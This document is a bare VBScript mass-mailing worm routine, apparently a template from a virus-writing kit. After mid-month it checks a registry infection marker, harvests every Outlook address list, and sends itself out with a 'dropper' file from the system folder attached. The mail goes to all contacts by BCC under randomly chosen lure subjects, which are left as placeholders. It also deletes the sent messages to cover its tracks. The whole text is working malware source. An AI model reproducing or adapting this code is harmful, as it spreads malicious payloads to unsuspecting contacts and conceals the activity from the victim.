On Error Resume Next
If Day(Now) > 14 Then
Set A = CreateObject("WScript.Shell")
B = A.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Currentversion\Asmodeus")
If B <> "Ikx" Then
Set C = CreateObject("Outlook.Application")
Set D = C.GetNameSpace("MAPI")
For Each E In D.AddressLists
If E.AddressEntries.Count > 0 Then
Set F = C.CreateItem(0)
For G = 1 To E.AddressEntries.Count
Set H = E.AddressEntries(G)
If G = 1 Then
F.BCC = H.Address
Else
F.BCC = F.BCC & "; " & H.Address
End If
Next
Randomize
I = Int(3 * Rnd + 1)
If I = 1 Then
F.Subject = "Replace, subject 1"
F.Body = "Replace, e-mail body 1"
ElseIf I = 2 Then
F.Subject = "Replace, subject 2"
F.Body = "Replace, e-mail body 2"
Else
F.Subject = "Replace, subject 3"
F.Body = "Replace, e-mail body 3"
End If
Set J = CreateObject("Scripting.FileSystemObject")
F.Attachments.Add J.BuildPath(J.GetSpecialFolder(1),"Replace, name of the dropper")
F.DeleteAfterSubmit = True
F.Send
End If
Next
A.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Asmodeus","Ikx"
End If
End If
